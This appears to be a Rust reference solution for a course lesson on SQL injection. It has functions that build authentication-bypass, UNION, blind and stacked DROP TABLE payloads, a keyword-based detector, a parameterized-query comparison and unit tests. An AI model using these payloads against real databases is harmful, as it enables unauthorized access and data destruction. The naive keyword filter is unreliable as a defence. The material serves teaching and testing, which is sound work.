//! # Lesson 02: SQL Injection Attack Demonstrations (Reference Solution)
//!
//! See the exercise file for full documentation.

/// Classic authentication bypass payload.
pub fn auth_bypass_payload() -> String {
    "' OR '1'='1' --".to_string()
}

/// Build a UNION injection payload for the given column count.
pub fn union_injection_payload(column_count: usize) -> String {
    let columns: Vec<String> = (1..=column_count)
        .map(|i| {
            if i <= 2 {
                format!("col{}", i)
            } else {
                format!("col{}", i)
            }
        })
        .collect();
    format!(
        "' UNION SELECT {} FROM secret_table --",
        columns.join(", ")
    )
}

/// Build a blind boolean-based injection payload.
pub fn blind_injection_payload(
    table: &str,
    column: &str,
    row_id: u32,
    _position: usize,
    expected_char: char,
) -> String {
    format!(
        "' AND (SELECT SUBSTRING({},1,1) FROM {} WHERE id={}) = '{}",
        column, table, row_id, expected_char
    )
}

/// Build a stacked query injection payload with DROP TABLE.
pub fn stacked_query_injection(original_input: &str, target_table: &str) -> String {
    format!("{}; DROP TABLE {}; --", original_input, target_table)
}

/// Detect common SQL injection patterns in input.
pub fn detect_injection_attempt(input: &str) -> bool {
    let upper = input.to_uppercase();
    let patterns = [
        "'",
        "--",
        ";",
        "UNION",
        "SELECT",
        "DROP",
        "OR '1'='1'",
        "OR 1=1",
        "INSERT",
        "DELETE",
        "UPDATE",
        "EXEC",
        "EXECUTE",
    ];
    patterns
        .iter()
        .any(|pattern| upper.contains(&pattern.to_uppercase()))
}

/// Analyze input for SQL injection.
pub fn analyze_input(input: &str) -> (bool, String, bool) {
    let is_attack = detect_injection_attempt(input);
    let payload = if is_attack {
        input.to_string()
    } else {
        String::new()
    };
    (is_attack, payload, is_attack)
}

/// Show vulnerable vs parameterized query for malicious input.
pub fn show_defense_in_depth(malicious_input: &str) -> (String, String, String) {
    let vulnerable = format!(
        "SELECT * FROM users WHERE username = '{}'",
        malicious_input
    );
    let safe = "SELECT * FROM users WHERE username = $1".to_string();
    (vulnerable, safe, malicious_input.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_auth_bypass_is_valid_attack() {
        let payload = auth_bypass_payload();
        assert!(payload.contains("OR"), "Bypass must contain OR");
        assert!(payload.contains("--"), "Bypass must contain comment");
        assert!(detect_injection_attempt(&payload), "Should detect bypass attempt");
    }

    #[test]
    fn test_union_injection_detected() {
        let payload = union_injection_payload(2);
        assert!(detect_injection_attempt(&payload), "Should detect UNION injection");
        assert!(payload.to_uppercase().contains("UNION"));
        assert!(payload.to_uppercase().contains("SELECT"));
    }

    #[test]
    fn test_blind_injection_detected() {
        let payload = blind_injection_payload("users", "password", 1, 1, 'a');
        assert!(detect_injection_attempt(&payload), "Should detect blind injection");
    }

    #[test]
    fn test_stacked_query_detected() {
        let payload = stacked_query_injection("normal_input", "users");
        assert!(payload.contains(';'), "Stacked queries use semicolons");
        assert!(payload.to_uppercase().contains("DROP"), "Should contain DROP TABLE");
        assert!(detect_injection_attempt(&payload));
    }

    #[test]
    fn test_clean_input_not_flagged() {
        assert!(!detect_injection_attempt("alice"));
        assert!(!detect_injection_attempt("john.doe@email.com"));
        assert!(!detect_injection_attempt("Hello World 123"));
    }

    #[test]
    fn test_analyze_clean_input() {
        let (is_attack, _payload, _blocked) = analyze_input("normal_user");
        assert!(!is_attack, "Clean input should not be flagged");
    }

    #[test]
    fn test_analyze_attack_input() {
        let attack = "' OR '1'='1' --";
        let (is_attack, _payload, _blocked) = analyze_input(attack);
        assert!(is_attack, "Attack input should be flagged");
    }

    #[test]
    fn test_defense_in_depth() {
        let malicious = "'; DROP TABLE users; --";
        let (vulnerable, safe, param) = show_defense_in_depth(malicious);
        assert!(vulnerable.contains("DROP"), "Vulnerable query exposes DROP");
        assert!(safe.contains("$1"), "Safe query uses placeholder");
        assert_eq!(param, malicious, "Parameter holds the raw malicious string");
    }
}
